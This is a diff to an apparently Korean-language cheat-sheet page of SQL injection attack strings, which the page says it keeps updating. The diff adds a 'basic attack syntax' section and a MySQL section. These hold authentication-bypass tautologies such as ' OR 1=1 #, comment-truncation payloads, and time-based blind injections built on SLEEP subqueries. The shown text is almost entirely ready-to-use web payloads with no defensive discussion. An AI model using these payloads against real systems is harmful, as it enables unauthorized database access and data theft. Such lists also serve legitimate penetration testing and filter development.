@@ -24,10 +24,19 @@ SQL Injection 공격 구문 정리를 위한 페이지로 지속적으로 업데
 <br/><br/>
 
 
-## 공격 구문
+## 기초 공격 구문
 ```
-1' or''='
+1' or ''='
+1' or 1#
+1' or 1 and sleep(5)#
+1' or 1 limit 1#
 ' OR 1=1 --
+' OR 1=1 #
 
 ```
 
+
+## MYSQL
+```
+test' AND (SELECT 3559 FROM (SELECT(SLEEP(3*3)))MYwF) AND 'kFIy%'='kFIy
+```
